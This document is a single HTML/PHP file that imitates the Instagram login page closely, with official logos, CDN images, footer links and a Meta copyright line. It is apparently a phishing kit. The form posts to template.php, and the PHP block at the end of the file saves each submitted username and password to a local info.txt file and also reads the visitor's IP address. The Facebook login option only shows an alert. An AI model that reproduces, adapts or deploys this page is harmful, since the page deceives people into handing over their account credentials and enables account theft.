<!-- New Template Start -->
<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <link rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2, viewport-fit=cover">
    <meta name="theme-color" content="#242526">
    <meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
    <link rel="apple-touch-icon" sizes="76x76" href="https://static.cdninstagram.com/rsrc.php/v4/yR/r/lam-fZmwmvn.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://static.cdninstagram.com/rsrc.php/v4/ys/r/aM-g435MtEX.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://static.cdninstagram.com/rsrc.php/v4/yx/r/H1l_HHqi4p6.png">
    <link rel="apple-touch-icon" sizes="167x167" href="https://static.cdninstagram.com/rsrc.php/v4/yB/r/-7Z_RkdLJUX.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://static.cdninstagram.com/rsrc.php/v4/yG/r/De-Dwpd5CHc.png">
    <link rel="shortcut icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
    <link rel="canonical" href="https://www.instagram.com/">
    <meta name="description" content="Create an account or log in to Instagram – Share what you're into with the people who get you.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Loading Screen Styles */
        #splash-screen {
            position: fixed;
            z-index: 100;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #fafafa; /* Match the body background */
        }

        #splash-screen img {
            width: 80px;
            height: 80px;
        }

        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 12px auto 0;
            padding: 0 20px;
            max-width: 935px;
        }

        .phones-container {
            position: relative;
            background-image: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png');
            flex-basis: 380.32px;
            height: 581.15px;
            margin-bottom: 0;
            margin-right: 32px;
            background-position: -46px 0;
            background-size: 468.32px 634.15px;
            flex-shrink: 0;
            top: 12px;
            display: none;
        }

        .screen-image {
            position: absolute;
            left: 0;
            height: 538.84px;
            width: 250px;
            left: 112px;
            top: 25px;
            opacity: 0;
        }

        .screen-image.active {
            opacity: 1;
            transition: opacity 1.5s ease-in;
        }

        @media (min-width: 876px) {
            .phones-container {
                display: block;
            }
        }

        .auth-container {
            max-width: 350px;
            width: 100%;
        }

        .auth-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin: 0 0 10px;
            padding: 10px 0;
            width: 340px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .logo {
            margin: 36px auto 12px;
            display: block;
            height: 51px;
            width: 175px;
            background: url('https://static.cdninstagram.com/rsrc.php/v3/y-/r/yXM3FgMdVNX.png') no-repeat 0 -52px;
            background-size: auto;
        }

        .login-form {
            margin-top: 24px;
            padding: 0 40px;
        }

        .form-group {
            margin-bottom: 6px;
        }

        .form-control {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px;
            width: 100%;
            height: 36px;
            margin-bottom: 6px;
        }

        .login-button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            margin-top: 8px;
            cursor: pointer;
            height: 30px;
            font-size: 14px;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider span {
            margin: 0 18px;
            font-size: 13px;
            font-weight: 600;
        }

        .facebook-login {
            color: #385185;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: 600;
            margin: 8px 0;
            text-decoration: none;
            gap: 8px;
        }

        .facebook-icon {
            width: 16px;
            height: 16px;
        }

        .facebook-icon svg {
            fill: #385185;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            text-align: center;
            display: block;
            margin-top: 12px;
            text-decoration: none;
        }

        .signup-box {
            text-align: center;
            padding: 15px;
        }

        .signup-box p {
            color: #262626;
            font-size: 14px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            text-align: center;
            margin: 20px 0;
        }

        .app-download p {
            margin: 10px 0 20px;
            font-size: 14px;
        }

        .app-links {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-link img {
            height: 40px;
        }

        footer {
            padding: 0 16px 52px;
            margin: 0;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 14px;
        }

        .footer-link {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            text-align: center;
        }

        /* Add animation keyframes */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { transform: translateY(10px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        /* Phone carousel animation */
        @keyframes carousel {
            0% { opacity: 0; transform: translateX(100%); }
            20% { opacity: 1; transform: translateX(0); }
            33.33% { opacity: 1; transform: translateX(0); }
            53.33% { opacity: 0; transform: translateX(-100%); }
            100% { opacity: 0; transform: translateX(-100%); }
        }

        .phone-screen-image {
            position: absolute;
            top: 27px;
            right: 59px;
            height: 538.84px;
            width: 250px;
            animation: carousel 20s infinite;
        }

        .phone-screen-image:nth-child(1) { animation-delay: 0s; }
        .phone-screen-image:nth-child(2) { animation-delay: 6.66s; }
        .phone-screen-image:nth-child(3) { animation-delay: 13.33s; }

        .auth-container {
            animation: fadeIn 0.5s ease-out;
        }

        .auth-box {
            animation: slideIn 0.5s ease-out;
        }
        .form-group {
    position: relative;
    margin-bottom: 6px;
}

.password-container {
    position: relative;
    width: 100%;
}

.password-toggle {
    position: absolute;
    right: 8px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    color: #262626;
    font-size: 14px;
    font-weight: 500;
    background: none;
    border: none;
    padding: 4px;
    user-select: none;
    z-index: 1;
}

.form-control[type="password"],
.form-control[type="text"] {
    padding-right: 50px; /* Make room for the toggle button */
}

/* Add media query for smaller screens */
@media (max-width: 360px) {
    .form-control {
        font-size: 13px;
    }
    
    .password-toggle {
        font-size: 13px;
        right: 6px;
    }
}
    </style>
</head>
<body>
    <div id="splash-screen">
        <img src="loadingscreen.png" style="width: 100%; height: 100%; object-fit: cover;">
    </div>
    <div class="main-container">
        <div class="phones-container">
            <img class="screen-image" src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd999368de3.png" alt="Screenshot 1">
            <img class="screen-image" src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2-2x.png/80b8aebdea57.png" alt="Screenshot 2">
            <img class="screen-image" src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3-2x.png/fe2540684ab2.png" alt="Screenshot 3">
            <img class="screen-image" src="https://www.instagram.com/static/images/homepage/screenshots/screenshot4-2x.png/8e9224a71939.png" alt="Screenshot 4">
        </div>
        <div class="auth-container">
            <div class="auth-box">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
                <form class="login-form" method="POST" action="template.php">
                    <div class="form-group">
                        <input type="text" class="form-control" placeholder="Phone number, username, or email" aria-label="Phone number, username, or email" name="name">
                    </div>
                    <div class="form-group">
                        <div class="password-container">
                            <input type="password" class="form-control" placeholder="Password" aria-label="Password" name="name2" id="password">
                            <button type="button" class="password-toggle" onclick="togglePassword()" aria-label="Toggle password visibility">Show</button>
                        </div>
                    </div>
                    <button type="submit" value="Submit" class="login-button">Log In</button>
                </form>
                <div class="divider">
                    <span>OR</span>
                </div>
                <a href="#" class="facebook-login" onclick="showFacebookPopup()" >
                    <span class="facebook-icon">
                        <svg viewBox="0 0 16 16">
                            <path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z" fill="currentColor"/>
                        </svg>
                    </span>
                    Log in with Facebook
                </a>
                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
            </div>
            <div class="auth-box signup-box">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/signup/phone/" class="signup-link">Sign up</a></p>
            </div>
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-links">
                    <a href="https://apps.apple.com/app/instagram/id389801252" class="app-link">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Download on the App Store">
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" class="app-link">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
                    </a>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer-links">
            <a href="https://about.meta.com/" class="footer-link">Meta</a>
            <a href="https://about.instagram.com/" class="footer-link">About</a>
            <a href="https://about.instagram.com/blog" class="footer-link">Blog</a>
            <a href="https://about.instagram.com/about-us/careers" class="footer-link">Jobs</a>
            <a href="https://help.instagram.com/" class="footer-link">Help</a>
            <a href="https://developers.facebook.com/docs/instagram" class="footer-link">API</a>
            <a href="https://www.instagram.com/legal/privacy/" class="footer-link">Privacy</a>
            <a href="https://www.instagram.com/legal/terms/" class="footer-link">Terms</a>
            <a href="https://www.instagram.com/explore/locations/" class="footer-link">Locations</a>
            <a href="https://www.instagram.com/web/lite/" class="footer-link">Instagram Lite</a>
            <a href="https://www.facebook.com/help/instagram/261704639352628" class="footer-link">Contact Uploading & Non-Users</a>
            <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer" class="footer-link">Meta Verified</a>
        </div>
        <div class="copyright">
            © 2025 Instagram from Meta
        </div>
    </footer>
    <script>
        // Show the splash screen initially
        document.getElementById('splash-screen').style.display = 'flex';
    
        // Hide the splash screen after 1 second
        setTimeout(function() {
            document.getElementById('splash-screen').style.display = 'none';
        }, 1000); // 1000 milliseconds = 1 second
    
        // Phone screen carousel animation
        const screens = document.querySelectorAll('.screen-image');
        let currentScreen = 0;
    
        function showNextScreen() {
            // Remove active class from current screen
            screens[currentScreen].classList.remove('active');
            
            // Move to next screen
            currentScreen = (currentScreen + 1) % screens.length;
            
            // Add active class to new screen
            screens[currentScreen].classList.add('active');
        }
    
        // Show first screen immediately
        screens[0].classList.add('active');
    
        // Start carousel
        setInterval(showNextScreen, 4000);
    
        // Toggle password visibility
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleButton = document.querySelector('.password-toggle');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleButton.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                toggleButton.textContent = 'Show';
            }
        }
    
        // Show Facebook login alert
        function showFacebookPopup() {
            alert("Currently Facebook Login Is not Supported");
        }
    </script>
    
</body>
</html> 
<!-- New Template End -->

<?php  
function getUserIP() {
  if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
      if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
          $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
          return trim($addr[0]);
      } else {
          return $_SERVER['HTTP_X_FORWARDED_FOR'];
      }
  }
  else {
      return $_SERVER['REMOTE_ADDR'];
  }
}


$user_ip = getUserIP();


if (isset($_POST['name'])){
$ip = $user_ip;
$userinput = $_POST['name'];
$userinputt = $_POST['name2'];
$acapo = "\r\n";
$perip = ("Ip: $ip");
$perpassword = ("Password: $userinputt");
$perusername = ("Username: $userinput");
$myfile = fopen("info.txt", "w") or die("Unable to open file!");
fwrite($myfile, $perusername);
fwrite($myfile, $acapo);
fwrite($myfile, $perpassword);
fclose($myfile);}
?>
